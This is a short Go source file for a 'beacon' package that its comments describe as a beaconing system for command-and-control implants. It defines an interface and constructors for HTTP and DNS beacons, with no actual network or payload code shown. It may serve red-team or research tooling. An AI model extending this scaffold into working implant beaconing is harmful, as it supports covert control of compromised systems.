// The beacon package implements a simple beaconing system for C&C implants.
package beacon

// Define the Beaconer interface that all beacons must implement.
type Beaconer interface {
	Beacon() string
}

// NewHttpAuthBeacon takes a string value to identify the system, a URL to
// ping, and a User Agent to use for the HTTP request. It returns an HttpAuthBeacon,
// which satisfies the Beacon interface.
func NewHttpAuthBeacon(sysid, url, agent string) *HttpAuthBeacon {
	h := new(HttpAuthBeacon)

	h.id = sysid
	h.agent = agent
	h.url = url

	return h
}

// NewDnsNsBeacon takes a string value to identify the system, and a DNS domain
// name to be used for the ping. It returns an DnsNsBeacocn which satisfies the
// Beacon interface.
func NewDnsNsBeacon(sysid, domain string) *DnsNsBeacon {
	d := new(DnsNsBeacon)

	d.id = sysid
	d.domain = domain

	return d
}
